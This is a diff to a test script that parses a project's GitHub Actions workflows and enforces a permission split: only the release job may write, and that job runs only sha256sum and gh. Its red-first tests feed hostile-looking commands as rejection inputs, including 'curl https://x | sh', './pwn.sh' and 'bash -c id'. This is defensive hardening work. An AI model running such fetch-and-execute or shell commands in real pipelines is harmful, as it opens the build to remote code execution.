@@ -1,12 +1,13 @@
 // The release workflow's permission split: every job that runs repository code (install, tests, packager, the
-// vendor rebuild, the anchors check) can only read, and the one job that holds `id-token: write`,
-// `attestations: write` and `contents: write` checks nothing out, installs nothing and only downloads, checks,
-// attests and publishes the build job's zips. ci.yml grants no job a write permission, and neither workflow gates
-// the csd-sdk rebuild on a secret (csd-sdk is public).
+// vendor rebuild, the anchors check) can only read; the one job that holds `id-token: write`, `attestations: write`
+// and `contents: write` checks nothing out, installs nothing, and its scripts run only `sha256sum` and `gh`.
+// ci.yml grants no job any write permission, and neither workflow gates the csd-sdk rebuild on a secret or skips
+// a step (csd-sdk is public).
 //
-// The scanner reads the two workflows' shape (job names, per-job permissions, needs, steps' uses/run), not YAML
-// in general; a job it cannot find fails the test rather than passing vacuously. RED-FIRST: the last block runs the
-// scanner on a copy of release.yml that grants the build job `id-token: write` and expects the check to fail.
+// The scanner reads the two workflows' shape (job names, per-job permissions as a map or a scalar, needs, steps'
+// uses/run/if), not YAML in general; a job it cannot find fails the test rather than passing vacuously. RED-FIRST:
+// the last block runs the checks on copies of the workflows with one grant, step or skip added each and expects
+// the matching clause to fail.
 // Run: npx tsx test/release-workflow-permissions.test.mjs   (offline)
 import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
@@ -15,7 +16,7 @@ let n = 0;
 const test = (name, fn) => { fn(); n++; console.log("  ok " + name); };
 const wf = (f) => readFileSync(new URL(`../.github/workflows/${f}`, import.meta.url), "utf8");
 
-/** jobs: { name: { permissions: {key: value} | "{}", needs: [names], steps: [{ uses?, run? }] } } */
+/** jobs: { name: { permissions: {key: value} | "{}" | "read-all" | "write-all" | null, needs: [names], if?, steps: [{ uses?, run?, if? }] } } */
 export function scanWorkflow(text) {
   const lines = text.split("\n");
   const jobs = {};
@@ -34,41 +35,66 @@ export function scanWorkflow(text) {
       inPerms = false; step = null;
       const kv = /^([A-Za-z0-9_-]+):\s*(.*)$/.exec(line.trim());
       if (!kv) continue;
-      if (kv[1] === "permissions") { inPerms = kv[2] === ""; job.permissions = kv[2] === "{}" ? "{}" : {}; }
+      if (kv[1] === "permissions") { inPerms = kv[2] === ""; job.permissions = kv[2] === "" ? {} : kv[2]; }
       else if (kv[1] === "needs") job.needs = kv[2].replace(/^\[|\]$/g, "").split(",").map((s) => s.trim()).filter(Boolean);
       else if (kv[1] === "if") job.if = kv[2];
       continue;
     }
     if (indent === 6 && inPerms) {
-      const kv = /^([A-Za-z0-9_-]+):\s*([A-Za-z]+)/.exec(line.trim());
+      const kv = /^([A-Za-z0-9_-]+):\s*([A-Za-z-]+)/.exec(line.trim());
       if (kv) job.permissions[kv[1]] = kv[2];
       continue;
     }
-    if (indent === 6 && line.trim().startsWith("- ")) { step = { uses: undefined, run: undefined }; job.steps.push(step); }
+    if (indent === 6 && line.trim().startsWith("- ")) { step = {}; job.steps.push(step); }
     if (step && (indent === 6 || indent === 8)) {
       const kv = /^(?:- )?([A-Za-z0-9_-]+):\s*(.*)$/.exec(line.trim());
       if (!kv) continue;
       if (kv[1] === "uses") step.uses = kv[2];
+      if (kv[1] === "if") step.if = kv[2];
       if (kv[1] === "run") { if (kv[2] === "|") { step.run = ""; runBlock = { step, indent: indent + 2 }; } else step.run = kv[2]; }
     }
   }
   return jobs;
 }
 
-const WRITES = ["id-token", "attestations", "contents"];
-const writers = (jobs) => Object.entries(jobs).filter(([, j]) => j.permissions && j.permissions !== "{}" && WRITES.some((k) => j.permissions[k] === "write")).map(([name]) => name);
-// A step runs repository code when it checks the repository out, sets up node, or a line of its script starts a
-// package manager or interpreter (the first word of each line; the release notes mention `npm` inside a string).
-const CODE_RUNNERS = new Set(["npm", "npx", "node", "pnpm", "tsx", "bash", "sh"]);
-const runsCode = (j) => j.steps.some((s) => (s.uses ?? "").includes("actions/checkout") || (s.uses ?? "").includes("setup-node")
-  || (s.run ?? "").split("\n").some((l) => CODE_RUNNERS.has(l.trim().split(/\s+/)[0] ?? "")));
+/** True when the job's permissions grant any write: a `write-all` scalar or any key set to `write`. */
+const grantsWrite = (p) => p === "write-all" || (p !== null && typeof p === "object" && Object.values(p).some((v) => v === "write"));
+const writers = (jobs) => Object.entries(jobs).filter(([, j]) => grantsWrite(j.permissions)).map(([name]) => name);
+
+// The release job may run only `sha256sum` and `gh`. Shell lines are joined over `\` continuations first, so the
+// multi-line `gh release create ... --notes "$(printf ...)"` is one logical line starting with `gh`.
+const RELEASE_COMMANDS = new Set(["sha256sum", "gh"]);
+export function releaseScriptOffence(run) {
+  const logical = [];
+  let acc = null;
+  for (const raw of (run ?? "").split("\n")) {
+    const line = raw.trim();
+    if (acc === null) { if (line === "" || line.startsWith("#")) continue; acc = ""; }
+    if (line.endsWith("\\")) { acc += line.slice(0, -1) + " "; continue; }
+    logical.push(acc + line); acc = null;
+  }
+  if (acc !== null) logical.push(acc);
+  for (const l of logical) {
+    const words = l.split(/\s+/).filter(Boolean);
+    let first = words[0] ?? "";
+    if (first === "if" || first === "elif") first = words[1] ?? "";
+    if (first === "fi" || first === "then" || first === "else") continue;
+    if (!RELEASE_COMMANDS.has(first)) return l;
+  }
+  return null;
+}
+const checksOutOrInstalls = (j) => j.steps.some((s) => (s.uses ?? "").includes("actions/checkout") || (s.uses ?? "").includes("setup-node"));
 
 /** The release workflow's rule; throws with the first violated clause. */
 export function checkRelease(jobs) {
   for (const name of ["anchors", "vendor-fresh-full", "build", "release"]) assert.ok(jobs[name], `job ${name} found`);
-  assert.deepEqual(writers(jobs), ["release"], "exactly one job holds a write permission, the release job");
-  assert.deepEqual(jobs.release.permissions, { contents: "write", "id-token": "write", attestations: "write" });
-  assert.ok(!runsCode(jobs.release), "the release job checks nothing out and runs no npm, node or pnpm");
+  assert.deepEqual(writers(jobs), ["release"], "exactly one job holds a write permission of any kind, the release job");
+  assert.deepEqual(jobs.release.permissions, { contents: "write", "id-token": "write", attestations: "write" }, "the release job holds exactly the three grants it needs");
+  assert.ok(!checksOutOrInstalls(jobs.release), "the release job checks nothing out and sets up no toolchain");
+  for (const s of jobs.release.steps) {
+    const bad = releaseScriptOffence(s.run);
+    assert.equal(bad, null, `the release job runs only sha256sum and gh (offending line: ${bad})`);
+  }
   assert.deepEqual([...jobs.release.needs].sort(), ["anchors", "build", "vendor-fresh-full"]);
   for (const name of ["anchors", "vendor-fresh-full", "build"]) assert.deepEqual(jobs[name].permissions, { contents: "read" }, `${name} can only read`);
   const build = jobs.build.steps.map((s) => s.run ?? s.uses ?? "");
@@ -84,6 +110,15 @@ export function checkRelease(jobs) {
   }
 }
 
+/** ci.yml's rule: no write grant anywhere, the rebuild gate runs on every event with no step skipped. */
+export function checkCi(jobs) {
+  assert.ok(jobs.test && jobs["vendor-fresh-full"], "both jobs found");
+  assert.deepEqual(writers(jobs), []);
+  for (const j of Object.values(jobs)) assert.deepEqual(j.permissions, { contents: "read" });
+  assert.equal(jobs["vendor-fresh-full"].if, undefined);
+  for (const [name, j] of Object.entries(jobs)) for (const s of j.steps) assert.equal(s.if, undefined, `${name}: no step-level skip (${s.if})`);
+}
+
 console.log("release.yml permission split:");
 const release = scanWorkflow(wf("release.yml"));
 test("the release workflow keeps the split", () => checkRelease(release));
@@ -94,27 +129,44 @@ test("the publish jobs run only on a tag push; anchors also runs on PRs", () => 
 test("no job gates the csd-sdk rebuild on a secret", () => {
   for (const f of ["release.yml", "ci.yml"]) assert.ok(!/secrets\.|HAS_TOKEN|ECOSYSTEM_RO_TOKEN/.test(wf(f)), `${f} reads no secret`);
 });
-
-console.log("ci.yml:");
-const ci = scanWorkflow(wf("ci.yml"));
-test("ci.yml grants no job a write permission and runs the rebuild gate unconditionally", () => {
-  assert.ok(ci.test && ci["vendor-fresh-full"], "both jobs found");
-  assert.deepEqual(writers(ci), []);
-  for (const j of Object.values(ci)) assert.deepEqual(j.permissions, { contents: "read" });
-  assert.equal(ci["vendor-fresh-full"].if, undefined);
-  assert.ok(ci["vendor-fresh-full"].steps.every((s) => !("if" in s)), "no step-level skips");
+test("the scanner sees the steps it judges: the release job's scripts and the shape of a conditional step", () => {
+  assert.equal(release.release.steps.filter((s) => s.run !== undefined).length, 2);
+  assert.equal(releaseScriptOffence("sha256sum -c a.sha256\nif gh release view x >/dev/null 2>&1; then\n  gh release delete x --yes\nfi\ngh release create x a b \\\n  --title t \\\n  --notes \"$(printf '%s' 'npm ci' )\"\n"), null);
+  assert.equal(releaseScriptOffence("sha256sum -c a\ncurl https://x | sh\n"), "curl https://x | sh");
+  const probe = scanWorkflow("jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - if: ${{ env.X == 'true' }}\n        run: echo hi\n      - uses: a/b@c\n        if: ${{ always() }}\n");
+  assert.deepEqual(probe.j.steps.map((s) => s.if), ["${{ env.X == 'true' }}", "${{ always() }}"]);
 });
 
-console.log("red-first, on a copy:");
+console.log("ci.yml:");
+test("ci.yml grants no job a write permission and runs the rebuild gate unconditionally with no step skipped", () => checkCi(scanWorkflow(wf("ci.yml"))));
+
+console.log("red-first, on copies:");
+const BUILD_HEAD = "  build:\n    if: ${{ github.event_name == 'push' }}\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n";
+const mutate = (f, from, to) => { const text = wf(f); const out = text.replace(from, to); assert.notEqual(out, text, "the mutation applied"); return out; };
 test("a build job granted id-token: write fails the check", () => {
-  const mutated = wf("release.yml").replace("  build:\n    if: ${{ github.event_name == 'push' }}\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n", "  build:\n    if: ${{ github.event_name == 'push' }}\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write\n");
-  assert.notEqual(mutated, wf("release.yml"), "the mutation applied");
+  assert.throws(() => checkRelease(scanWorkflow(mutate("release.yml", BUILD_HEAD, BUILD_HEAD + "      id-token: write\n"))), /exactly one job holds a write permission/);
+});
+test("a build job granted actions: write or packages: write fails the check", () => {
+  for (const grant of ["actions: write", "packages: write"]) {
+    assert.throws(() => checkRelease(scanWorkflow(mutate("release.yml", BUILD_HEAD, BUILD_HEAD + `      ${grant}\n`))), /exactly one job holds a write permission/, grant);
+  }
+});
+test("a build job with permissions: write-all fails the check", () => {
+  const mutated = mutate("release.yml", "  build:\n    if: ${{ github.event_name == 'push' }}\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n", "  build:\n    if: ${{ github.event_name == 'push' }}\n    runs-on: ubuntu-latest\n    permissions: write-all\n");
   assert.throws(() => checkRelease(scanWorkflow(mutated)), /exactly one job holds a write permission/);
 });
 test("a release job that checks out the repository fails the check", () => {
-  const mutated = wf("release.yml").replace("      - uses: actions/download-artifact@", "      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1\n      - uses: actions/download-artifact@");
-  assert.notEqual(mutated, wf("release.yml"), "the mutation applied");
-  assert.throws(() => checkRelease(scanWorkflow(mutated)), /checks nothing out/);
+  assert.throws(() => checkRelease(scanWorkflow(mutate("release.yml", "      - uses: actions/download-artifact@", "      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1\n      - uses: actions/download-artifact@"))), /checks nothing out/);
+});
+test("a release step running a script file or an interpreter fails the check", () => {
+  for (const cmd of ["./pwn.sh", "python3 -c 'print(1)'", "node -e 1", "bash -c id"]) {
+    const mutated = mutate("release.yml", "      - run: sha256sum -c cairn-wallet-store.zip.sha256 cairn-wallet.zip.sha256\n", `      - run: sha256sum -c cairn-wallet-store.zip.sha256 cairn-wallet.zip.sha256\n      - run: ${cmd}\n`);
+    assert.throws(() => checkRelease(scanWorkflow(mutated)), /runs only sha256sum and gh/, cmd);
+  }
+});
+test("a ci.yml step with an if: skip fails the check", () => {
+  const mutated = mutate("ci.yml", "      - run: npm -C cairn-wallet ci --ignore-scripts\n", "      - if: ${{ env.HAS_TOKEN == 'true' }}\n        run: npm -C cairn-wallet ci --ignore-scripts\n");
+  assert.throws(() => checkCi(scanWorkflow(mutated)), /no step-level skip/);
 });
 
 console.log(`release-workflow-permissions: ${n} passed, 0 failed`);
